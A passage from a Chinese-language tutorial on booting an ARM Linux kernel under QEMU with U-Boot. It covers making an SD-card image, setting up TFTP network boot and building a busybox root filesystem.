<br></code></pre></td></tr></table></figure><p>制作 uImage 注意。uboot 有单独的工具生成 uImage，但是 Linux 内核也会自带工具用以从 zImage 来生成 uImage 。但是<strong>好像不是所有的 Linux 版本都自带这个工具</strong>。</p><p>所以我们可以使用 uboot 自带的工具来生成 uImage：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install u-boot-tools<br>make CROSS_COMPILE=arm-linux-gnueabi- ARCH=arm  LOADADDR=0x60003000 uImage -j8<br></code></pre></td></tr></table></figure><p>使用 uboot 引导 Linux内核时需要注意，不是直接使用 qemu 命令中的 <code>-kernel uImage</code>，就可以了。而是要使用其他方法：</p><ul><li>将 uImage 放到 SD 卡中，并制作启动脚本。这里还可以将根文件系统也放在 SD 卡中</li><li>使用 USB 启动，并制作启动脚本。</li><li>使用网络启动，并制作启动脚本。</li></ul><h3 id="将内核和根文件系统放到-SD-卡中"><a href="#将内核和根文件系统放到-SD-卡中" class="headerlink" title="将内核和根文件系统放到 SD 卡中"></a>将内核和根文件系统放到 SD 卡中</h3><p>介绍一下 <code>parted</code> 命令：</p><p><code>parted</code> 是一个功能强大的命令行分区管理工具，用于磁盘分区的创建、调整大小、移动、删除和文件系统格式化等操作。它支持多种类型的磁盘和分区表格式，包括 MBR（主引导记录）和 GPT（全局唯一标识磁盘分区表）。通常，<code>parted</code> 提供了一个交互式的命令行界面，你可以在其中输入命令并执行。但是，当需要自动化任务或者在脚本中使用 <code>parted</code> 时，交互式界面就不太适用了。这时，可以使用 <code>--script</code> 参数来指示 <code>parted</code> 执行一系列的命令，这些命令在 <code>--script</code> 之后直接写入，没有交互提示。</p><p>如果不使用 <code>--script</code> 参数，<code>parted</code> 会进入一个命令行模式，在该模式下，你可以输入命令，但是不能使用交互式命令。下面有一些常用的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">parted [设备路径] <span class="hljs-comment"># 启动 parted</span><br><span class="hljs-built_in">print</span> <span class="hljs-comment"># 打印磁盘信息</span><br>mklabel [分区表类型] <span class="hljs-comment"># 创建新分区，设置磁盘的分区表类型，例如 msdos 或 gpt。</span><br>mkpart [分区类型] [起始位置] [结束位置] <span class="hljs-comment"># 创建一个新的分区，其中 分区类型 可以是 primary、logical 或 extended，起始位置 和 结束位置 是以扇区为单位的。</span><br>mkfs [文件系统类型] [分区号] <span class="hljs-comment"># 格式化指定的分区，文件系统类型 可以是 ext2、ext3、ext4、xfs、ntfs 等。</span><br>resizepart [分区号] [新大小] <span class="hljs-comment"># 调整指定分区的大小。</span><br><span class="hljs-built_in">rm</span> [分区号] <span class="hljs-comment"># 删除指定的分区号</span><br>quit <span class="hljs-comment"># 退出 parted 命令行界面。</span><br></code></pre></td></tr></table></figure><p>首先，我们制作一个 SD 卡：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=SD  bs=1M count=64<br>sudo parted SD --script -- mklabel msdos  <br><span class="hljs-comment"># 这个命令在 SD 文件上创建一个新的分区表，使用 MS-DOS（MBR）分区表类型。</span><br><br><span class="hljs-comment"># 这里和2048对齐一下，减少一个警告 </span><br>sudo parted SD --script -- mkpart primary fat32 2048s 40956s<br><span class="hljs-comment"># 这个命令在 SD 文件上创建第一个主分区，使用 FAT32 文件系统，从磁盘的第 2048 个扇区开始，到第 40956 个扇区结束。</span><br>sudo parted SD --script -- mkpart primary ext4 40960s -1<br><span class="hljs-comment"># 这个命令在 SD 文件上创建第二个主分区，使用 ext4 文件系统，从第 40960 个扇区开始，一直到文件的末尾。</span><br><br><span class="hljs-comment"># 建立映射，然后格式化两个分区</span><br>sudo losetup --show /dev/loop15 SD<br><span class="hljs-comment"># sudo apt install kpartx</span><br>sudo kpartx -va /dev/loop15<br>sudo mkfs.vfat /dev/mapper/loop15p1<br><span class="hljs-comment"># 格式化第一个分区为 FAT32 文件系统</span><br>sudo mkfs.ext4 /dev/mapper/loop15p2<br><span class="hljs-comment"># 格式化第二分区为 ext4 文件系统</span><br><br><span class="hljs-comment"># 拷贝内核zImage、vexpress-v2p-ca9.dtb到第一个分区</span><br>sudo mount /dev/mapper/loop15p1 /mnt<br>sudo <span class="hljs-built_in">cp</span> ../linux-5.10/arch/arm/boot/uImage  /mnt<br>sudo <span class="hljs-built_in">cp</span> ../linux-5.10/arch/arm/boot/dts/vexpress-v2p-ca9.dtb /mnt<br><span class="hljs-comment"># 拷贝文件系统内的所有文件到第二个分区</span><br>sudo mount /dev/mapper/loop15p2 /media<br>sudo <span class="hljs-built_in">cp</span> -r ../busybox-1.32.0/rootfs/* /media<br>sudo <span class="hljs-built_in">chown</span> -R root.root /media/*<br><span class="hljs-comment"># 卸载</span><br>sudo umount /mnt<br>sudo umount /media​<br></code></pre></td></tr></table></figure><p>总结一下，上面的步骤包括：</p><ol><li>创建一个 64M 的空文件 SD，并格式化为 MS-DOS 分区表。</li><li>创建两个主分区，第一个分区为 FAT32 文件系统，第二个分区为 ext4 文件系统。</li><li>建立映射，并格式化两个分区。</li><li>拷贝内核和根文件系统到两个分区。</li><li>卸载两个分区。</li></ol><p>现在，我们已经完成了 SD 卡的制作，下面我们就可以使用 qemu 启动 Linux 系统了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># u-boot启动SD卡中的kernel和文件系统</span><br>qemu-system-arm \<br>-M vexpress-a9 \<br>-m 512M \<br>-kernel ./u-boot-2022.04/u-boot \<br>-nographic \<br>-append <span class="hljs-string">&quot;root=/dev/mmcblk0 console=ttyAMA0&quot;</span> \<br>-sd ./rootfs/SD<br><br><span class="hljs-comment"># 启动</span><br>fatls mmc 0:1<br>fatload mmc 0:1 60003000 uImage<br>fatload mmc 0:1 60500000 vexpress-v2p-ca9.dtb<br>setenv bootargs <span class="hljs-string">&#x27;init=/linuxrc root=/dev/mmcblk0p2 rw rootwait earlyprintk console=ttyAMA0&#x27;</span><br>bootm 60003000 - 60500000<br><br><span class="hljs-comment"># tips</span><br>这里对文件系统的修改会保存<br><br></code></pre></td></tr></table></figure><p>启动下面的这几个命令是在 uboot 启动之后的命令，也就是说，这些命令都是 uboot 自带的。</p><ol><li><p>列出 MMC 卡内容（如果使用 MMC 作为存储设备）：</p><pre><code class="hljs"> fatls mmc 0:1</code></pre></li><li><p>从 MMC 卡加载内核映像：</p><pre><code class="hljs"> fatload mmc 0:1 60003000 uImage</code></pre></li><li><p>从 MMC 卡加载设备树：</p><pre><code class="hljs"> fatload mmc 0:1 60500000 vexpress-v2p-ca9.dtb</code></pre></li><li><p>设置启动参数：</p><pre><code class="hljs"> setenv bootargs &#39;console=ttyAMA0,115200 root=/dev/mmcblk0p2 rw earlyprintk rootfstype=ext4&#39;</code></pre></li><li><p>启动 Linux 内核：</p><pre><code class="hljs"> bootm 60003000 60500000</code></pre></li></ol><p><strong>在这些步骤中，60003000 是内核映像加载到的内存地址，60500000 是设备树加载到的内存地址。这些地址可能需要根据你的系统进行调整。</strong></p><h3 id="使用网络启动"><a href="#使用网络启动" class="headerlink" title="使用网络启动"></a>使用网络启动</h3><p>通过网络中启动主要使用利用了 <code>tftp</code> 网络</p><p>通过网桥，将OS镜像(uImage)，通过网络协议下载到U-Boot中，从而通过U-Boot启动OS：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405260018033.png"></p><p>首先需要安装好一些前置的软件包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install tftp-hpa tftpd-hpa xinetd uml-utilities bridge-utils<br></code></pre></td></tr></table></figure><p>这个地方有两种方法可以实现网络启动：</p><ol><li>一个是手动配置参数。</li><li>第二个是直接修改 uboot 的源代码</li></ol><h4 id="手动配置参数"><a href="#手动配置参数" class="headerlink" title="手动配置参数"></a>手动配置参数</h4><p>这种方法不便于多次使用，而且每次都需要手动配置参数，比较麻烦。</p><ol><li><p>首先第一步是要配置好 tftp 服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 设置tftp配置路径文件</span><br>sudo vim /etc/default/tftpd-hpa<br><span class="hljs-comment"># 将下面的内容复制近来</span><br>TFTP_USERNAME=<span class="hljs-string">&quot;tftp&quot;</span><br>TFTP_DIRECTORY=<span class="hljs-string">&quot;/home/thinks2/ProgramProject/qemu_study/tftpboot&quot;</span> <span class="hljs-comment"># 该路径即为tftp可以访问到的路径</span><br>TFTP_ADDRESS=<span class="hljs-string">&quot;:69&quot;</span><br>TFTP_OPTIONS=<span class="hljs-string">&quot;--secure&quot;</span><br><span class="hljs-comment"># 重启tftp服务</span><br>sudo /etc/init.d/tftpd-hpa restart<br></code></pre></td></tr></table></figure></li><li><p>第二步需要创建好 tftp 目录，然后将内核、设备树、根文件系统放在这个文件夹中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ..<br><span class="hljs-built_in">mkdir</span> tftpboot<br><span class="hljs-built_in">cd</span> tftpboot<br><span class="hljs-built_in">cp</span> ../u-boot-2022.10/u-boot ./<br><span class="hljs-built_in">cp</span> ../linux-4.19.269/arch/arm/boot/uImage ./<br><span class="hljs-built_in">cp</span> ../linux-4.19.269/arch/arm/boot/dts/vexpress-v2p-ca9.dtb ./<br></code></pre></td></tr></table></figure></li><li><p>第三步配置网络信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig <span class="hljs-comment"># 查看网卡信息</span><br><span class="hljs-comment"># 修改/etc/netplan/01-network-manager-all.yaml的信息配置:</span><br>sudo vim /etc/netplan/01-network-manager-all.yaml<br><br><span class="hljs-comment"># 将下面的信息添加到其中去</span><br>network:<br>  version: 2<br>  renderer: networkd<br>  ethernets:<br>      ens37:    <span class="hljs-comment">#这里设置的是你还需要上网的网卡, ifconfig查看</span><br>          dhcp4: <span class="hljs-built_in">yes</span><br>      ens38:    <span class="hljs-comment">#这里设置的是br0桥接到的网卡</span><br>          dhcp4: no<br>  bridges:        <br>      br0:        <span class="hljs-comment">#这里设置的是br0网桥</span><br>          dhcp4: <span class="hljs-built_in">yes</span><br>          interfaces:<br>              - ens37 <span class="hljs-comment">#声明br0网桥接入的网卡是ens37</span><br><br>sudo netplan apply <span class="hljs-comment">#使得上面的配置生效</span><br>ifconfig <span class="hljs-comment">#重新查看网卡信息</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405260219395.png"></p></li><li><p>第四步需要配置 <code>/etc/qemu-ifdown</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/qemu-ifdown<br><span class="hljs-comment"># 将下面的内容添加到文件中</span><br><span class="hljs-comment">#! /bin/sh</span><br><span class="hljs-comment"># Script to shut down a network (tap) device for qemu.</span><br><span class="hljs-comment"># Initially this script is empty, but you can configure,</span><br><span class="hljs-comment"># for example, accounting info here.</span><br><span class="hljs-built_in">echo</span> sudo brctl delif br0 <span class="hljs-variable">$1</span><br>sudo brctl delif br0 <span class="hljs-variable">$1</span><br><span class="hljs-built_in">echo</span> sudo tunctl -d <span class="hljs-variable">$1</span><br>sudo tunctl -d <span class="hljs-variable">$1</span><br><span class="hljs-built_in">echo</span> brctl show<br>brctl show<br></code></pre></td></tr></table></figure></li><li><p>第五步配置 <code>/etc/qemu-ifup</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/qemu-ifup<br><span class="hljs-comment"># 将下面的内容添加到文件中</span><br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> sudo tunctl -u $(<span class="hljs-built_in">id</span> -un) -t <span class="hljs-variable">$1</span><br>sudo tunctl -u $(<span class="hljs-built_in">id</span> -un) -t <span class="hljs-variable">$1</span><br><span class="hljs-built_in">echo</span> sudo ifconfig <span class="hljs-variable">$1</span> 0.0.0.0 promisc up<br>sudo ifconfig <span class="hljs-variable">$1</span> 0.0.0.0 promisc up<br><span class="hljs-built_in">echo</span> sudo brctl addif br0 <span class="hljs-variable">$1</span><br>sudo brctl addif br0 <span class="hljs-variable">$1</span><br><span class="hljs-built_in">echo</span> brctl show<br>brctl show<br>sudo ifconfig br0 192.168.33.145 <span class="hljs-comment"># 这里设置的是网桥br0的地址</span><br></code></pre></td></tr></table></figure></li><li><p>回到 tftpboot 目录下，创建一个脚本文件，方便下次使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/tftpboot<br>vim ./start.sh<br><br><span class="hljs-comment">#添加下面的内容</span><br><br><span class="hljs-comment">#!/bin/sh</span><br>qemu-system-arm \<br>-M vexpress-a9 \<br>-m 512M \<br>-kernel ./u-boot-2022.10/u-boot \<br>-nographic \<br>-append <span class="hljs-string">&quot;root=/dev/sda1 console=ttyAMA0&quot;</span> \<br>    -sd rootfs.ext3 \<br></code></pre></td></tr></table></figure></li><li><p>运行上面的 start.sh 脚本进入 uboot 启动流程，此时再次对 uboot 进行配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">setenv ipaddr   192.168.33.144                              <span class="hljs-comment"># 设置u-boot这边的地址(和br0同一网段即可)</span><br>setenv serverip 192.168.33.145                            <span class="hljs-comment"># 设置服务器地址(br0网桥的地址)</span><br>tftp 0x60003000 uImage                                       <span class="hljs-comment"># 从tftp下载uImage</span><br>tftp 0x60500000 vexpress-v2p-ca9.dtb                     <span class="hljs-comment"># 从tftp下载设备树</span><br>setenv bootargs <span class="hljs-string">&quot;root=/dev/mmcblk0 rw console=ttyAMA0&quot;</span>       <span class="hljs-comment"># 设置根文件系统挂载位置、权限、控制台设备</span><br>bootm 0x60003000 - 0x60500000   <br></code></pre></td></tr></table></figure></li></ol><p><strong>至此，已经完成了所有的步骤</strong>，下面讲第二种方法，即直接修改 uboot 的源代码。</p><h4 id="直接修改-uboot-的源代码"><a href="#直接修改-uboot-的源代码" class="headerlink" title="直接修改 uboot 的源代码"></a>直接修改 uboot 的源代码</h4><p>这种方法比较简单，不需要配置额外的脚本文件，直接修改 uboot 的源代码即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ./u-boot<br>vim ./etc/config/vexpress_commom.h<br><span class="hljs-comment">#在文件下面添加</span><br><br><span class="hljs-comment">#define CONFIG_IPADDR   192.168.33.144</span><br><span class="hljs-comment">#define CONFIG_NETMASK  255.255.255.0</span><br><span class="hljs-comment">#define CONFIG_SERVERIP 192.168.33.145</span><br><br><span class="hljs-comment">#注意，下面的内容需要在比较新U-boot上面才可以使用。在makemenuconfig中找到： make menuconfig -&gt; Boot options -&gt; 勾除Enable a default value or bootcmd 注意需要首先勾除，然后再添加下面的内容。如果你使用的是旧版本的u-boot，则需要在makemenuconfig中去添加下面的内容。</span><br><br><span class="hljs-comment">#ifndef CONFIG_BOOTCOMMAND</span><br><span class="hljs-comment">#define PING_COMMAND &quot;ping 192.168.70.30;&quot;</span><br><span class="hljs-comment">#define CONFIG_BOOTCOMMAND \</span><br>    PING_COMMAND \<br>    <span class="hljs-string">&quot;tftp 0x60003000 uImage;&quot;</span> \<br>    <span class="hljs-string">&quot;tftp 0x60500000 vexpress-v2p-ca9.dtb;&quot;</span> \<br>    <span class="hljs-string">&quot;setenv bootargs &#x27;root=/dev/mmcblk0 rw console=ttyAMA0&#x27;;&quot;</span> \<br>    <span class="hljs-string">&quot;bootm 0x60003000 - 0x60500000;&quot;</span><br><span class="hljs-comment">#endif</span><br></code></pre></td></tr></table></figure><h4 id="参考资料——网络启动"><a href="#参考资料——网络启动" class="headerlink" title="参考资料——网络启动"></a>参考资料——网络启动</h4><ul><li><a href="https://www.jianshu.com/p/8619a6739040">https://www.jianshu.com/p/8619a6739040</a></li><li><a href="https://www.zhaixue.cc/qemu/qemu-u-boot.html">https://www.zhaixue.cc/qemu/qemu-u-boot.html</a></li><li><a href="https://blog.csdn.net/nature_07/article/details/128607903">https://blog.csdn.net/nature_07/article/details/128607903</a></li></ul><h2 id="准备好-rootfs"><a href="#准备好-rootfs" class="headerlink" title="准备好 rootfs"></a>准备好 rootfs</h2><p>Linux发行版的根文件系统很复杂，而我们这里用到的根文件系统很简单，<strong>我们要制作的根文件系统 &#x3D; busybox(包含基础的Linux命令)  + 运行库 + 几个字符设备。</strong> 根文件系统依赖于每个开发板支持的存储设备，可以放到Nor Flash上，也可以放到SD卡，甚至外部磁盘上。最关键的一点是你要清楚知道开发板有什么存储设备。</p><p>下面，我们来制作一个简单的根文件系统。</p><p>先在Ubuntu主机环境下，形成目录结构，里面存放的文件和目录与单板上运行所需要的目录结构完全一样，然后再打包成镜像（在开发板看来就是SD卡），这个临时的目录结构称为根目录。**这里其实还有第二中方法，即使用网络进行</p><ol><li><p>下载 busybox</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://busybox.net/downloads/busybox-1.36.1.tar.bz2<br></code></pre></td></tr></table></figure></li><li><p>busybox 编译</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xvf busybox-1.36.1.tar.bz2<br><span class="hljs-built_in">cd</span> busybox-1.36.1<br>make defconfig<br><br><span class="hljs-comment">#make menuconfig</span><br><span class="hljs-comment">#   勾选  Settings-&gt; [*] Build static binary (no shared libs) </span><br><span class="hljs-comment">#   如果勾选了上面的设置的话，编译出来的 busybox 就不会依赖动态链接库，可以减少空间占用。并且可以省略下面的制作根文件系统的时候的：</span><br><span class="hljs-comment">#   cp /usr/lib/arm-linux-gnueabi/lib* rootfs/lib/ 这个步骤可以省略。</span><br><br>make CROSS_COMPILE=arm-linux-gnueabi-<br>make install CROSS_COMPILE=arm-linux-gnueabi- -j8<br></code></pre></td></tr></table></figure><p> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405192029516.png"></p><p> 如果使用 <code>menuconfig</code> 进行配置的话，可以看到有很多选项，我们可以根据自己的需求进行选择：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">(1) 设置一下编辑器环境，方便操作:<br>Settings —-&gt; [*] vi-style line editing commands (New)<br><br>(2) 设置一下安装路径，避免错误安装在根目录<br>Settings —-&gt; Destination path <span class="hljs-keyword">for</span> ‘make install’<br><br></code></pre></td></tr></table></figure><p> 通过 <code>make install</code> 命令把生成的根文件创建在顶层目录(busybox-1.32.1根目录) <code>_install</code> 下，如果是通过 <code>make defconfig O=…/output</code> 导出配置的，则在相应的output目录下进入 <code>_install</code> 目录</p><p> 这个编译的地方还有第二种方法可以使用，即直接更改 <code>Makefile</code> 文件，再 <code>Makefile</code> 中找到 <code>ARCH</code> 和 <code>CROSS_COMPILE</code> 变量，修改成如下内容：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ARCH ?= arm<br>CROSS_COMPILE = arm-linux-gnueabi-<br></code></pre></td></tr></table></figure><p> 至此，我们已经准备好了 busybox ，下面需要的是制作一个根目录结构。</p></li><li><p>创建根目录结构</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p rootfs/&#123;dev,etc/init.d,lib&#125;<span class="hljs-built_in">mkdir</span> rootfs<br></code></pre></td></tr></table></figure><ul><li><p>将 busybox 复制到根目录下：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> busybox-1.36.1/_install/* -r rootfs/<br></code></pre></td></tr></table></figure></li><li><p>从工具链中拷贝运行库到lib目录下：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /usr/lib/arm-linux-gnueabi/lib* rootfs/lib/<br></code></pre></td></tr></table></figure></li><li><p>创建4个tty端终设备：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mknod</span> rootfs/dev/tty1 c 4 1<br>sudo <span class="hljs-built_in">mknod</span> rootfs/dev/tty2 c 4 2<br>sudo <span class="hljs-built_in">mknod</span> rootfs/dev/tty3 c 4 3<br>sudo <span class="hljs-built_in">mknod</span> rootfs/dev/tty4 c 4 4<br></code></pre></td></tr></table></figure></li></ul></li></ol><p><strong>至此，我们已经制作好了一个简单的根文件系统，里面包含了 busybox、运行库、4个字符设备。</strong>下面，我们需要制作根文件系统镜像文件。</p><ol start="4"><li><p>将上面的根文件打包成镜像文件</p><ul><li><p>生成512M大小的磁盘镜像</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-img create -f raw rootfs.ext3 512M<br></code></pre></td></tr></table></figure></li><li><p>格式化成ext3文件系统</p></li></ul> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkfs -t ext3 ./rootfs.ext3<br><span class="hljs-comment"># 或者</span><br>sudo mkfs.ext3 rootfs.ext3<br></code></pre></td></tr></table></figure><ul><li>将文件拷贝到镜像中 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> tmpfs<br>sudo mount -o loop -t ext3 ./rootfs.ext3 tmpfs/ <br>sudo <span class="hljs-built_in">cp</span> -r rootfs/* tmpfs/<br>sudo umount tmpfs<br></code></pre></td></tr></table></figure></li></ul><p> 其实这里除开上面提到的使用 <code>qemu-img</code> 这个命令之外，还可以使用 <code>dd</code> 命令来制作镜像文件。如下所示：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p tmpfs<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=rootfs.ext3 bs=1M count=512<br>mkfs.ext3 rootfs.ext3<br>sudo mount -o loop -t ext3 ./rootfs.ext3 tmpfs/ <br>sudo <span class="hljs-built_in">cp</span> -r rootfs/* tmpfs/<br>sudo umount tmpfs<br></code></pre></td></tr></table></figure><p> 其实，这种方法和第一种方法差不多。</p></li><li><p>测试</p><p> 这是最后一步，我们可以启动模拟器，并将镜像文件作为启动设备来启动系统。进行测试：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-arm\<br> -M vexpress-a9 \<br> -m 512M \<br> -kernel /path_to_kernel_dir/arch/arm/boot/zImage \<br> -dtb  /path_to_kernel_dir/arch/arm/boot/dts/vexpress-v2p-ca9.dtb\<br> -nographic \<br> -append <span class="hljs-string">&quot;root=/dev/mmcblk0  console=ttyAMA0&quot;</span> \<br> -sd rootfs.ext3<br></code></pre></td></tr></table></figure></li></ol><h2 id="启动qemu"><a href="#启动qemu" class="headerlink" title="启动qemu"></a>启动qemu</h2><p>注意这里和上面的不同点，一个是 u 一个是 z</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-arm\<br> -M vexpress-a9 \<br> -m 512M \<br> -kernel /path_to_kernel_dir/arch/arm/boot/uImage \<br> -dtb  /path_to_kernel_dir/arch/arm/boot/dts/vexpress-v2p-ca9.dtb\<br> -nographic \<br> -append <span class="hljs-string">&quot;root=/dev/mmcblk0  console=ttyAMA0&quot;</span> \<br> -sd rootfs.ext3<br></code></pre></td></tr></table></figure><p>参数解释：</p><ul><li>-M：指定模拟器的硬件平台，这里是 <code>vexpress-a9</code> 开发板。可以私用 <code>qemu-system-arm -M help</code> 查看所有支持的硬件平台。</li><li>-m：指定模拟器的内存大小，这里是 <code>512M</code>。</li><li>-kernel：指定内核文件，这里是 <code>uImage</code>。</li><li>-dtb：指定设备树文件，这里是 <code>vexpress-v2p-ca9.dtb</code>。**这个设备树文件也是 Linux 内核自己提供的，比如说 arm 架构下的设备树文件存放在 <code>linux-6.1.46/arch/arm/boot/dts</code></li><li>-nographic：不使用图形化界面，仅仅使用串口。</li><li>-append：指定启动参数，这里是 <code>root=/dev/mmcblk0  console=ttyAMA0</code>，表示启动时挂载根文件系统 <code>/dev/mmcblk0</code>，串口输出到 <code>ttyAMA0</code>。</li><li>-sd：指定 sd 卡设备，这里是用来指定启动设备，这里是 <code>rootfs.ext3</code>。</li></ul><h1 